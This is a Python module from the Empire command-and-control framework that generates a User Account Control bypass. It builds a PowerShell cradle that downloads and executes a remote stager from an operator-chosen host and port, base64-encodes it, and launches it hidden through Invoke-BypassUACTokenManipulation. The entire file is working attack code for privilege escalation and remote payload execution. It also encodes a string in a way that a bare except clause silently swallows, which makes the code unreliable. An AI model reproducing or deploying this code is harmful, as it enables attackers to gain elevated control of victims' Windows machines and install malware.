import base64
import re

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        # options
        stager = params["Stager"]
        host = params["Host"]
        port = params["Port"]

        try:
            blank_command = ""
            powershell_command = ""
            encoded_cradle = ""
            cradle = "IEX \"(new-object net.webclient).downloadstring('{}:{}/{}')\"|IEX".format(
                host, port, stager
            )
            # Remove weird chars that could have been added by ISE
            n = re.compile("(\xef|\xbb|\xbf)")
            # loop through each character and insert null byte
            for char in n.sub("", cradle):
                # insert the nullbyte
                blank_command += char + "\x00"
            # assign powershell command as the new one
            powershell_command = blank_command
            # base64 encode the powershell command

            encoded_cradle = base64.b64encode(powershell_command)

        except Exception:
            pass

        script_end = 'Invoke-BypassUACTokenManipulation -Arguments "-w 1 -enc %s"' % (
            encoded_cradle
        )

        return script, script_end
